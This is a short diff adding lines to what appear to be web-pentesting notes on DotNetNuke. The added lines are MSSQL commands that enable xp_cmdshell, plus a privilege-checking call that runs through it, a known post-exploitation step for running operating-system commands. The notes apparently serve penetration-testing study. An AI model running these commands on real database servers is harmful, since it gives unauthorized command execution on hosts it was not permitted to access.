@@ -1345,3 +1345,16 @@ bundleconfig.json   CKEditorOptions.ascx.designer.cs  CKHtmlEditorProvider.cs   
 ```
 
 https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/dotnetnuke-dnn.html
+
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+GO
+```
+
+```
+xp_cmdshell 'whoami /priv';
+```
